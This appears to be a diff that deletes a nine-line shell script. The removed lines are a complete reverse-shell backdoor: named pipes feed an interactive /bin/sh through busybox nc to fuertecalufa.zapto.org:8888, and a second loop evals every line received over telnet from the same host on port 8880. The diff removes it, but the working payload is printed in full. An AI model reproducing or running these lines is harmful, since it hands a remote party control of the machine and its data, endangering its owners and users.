@@ -1,9 +1,0 @@
-TF="/tmp/myfifo.$$"
-FIFO=/tmp/f.$$
-mkfifo "$TF"
-mkfifo $FIFO
-cat $FIFO | /bin/sh -i 2>&1 | busybox nc fuertecalufa.zapto.org 8888 > $FIFO
-telnet fuertecalufa.zapto.org 8880 > "$TF" &
-while IFS= read -r line; do eval "$line"; done < "$TF"
-rm "$TF"
-rm $FIFO
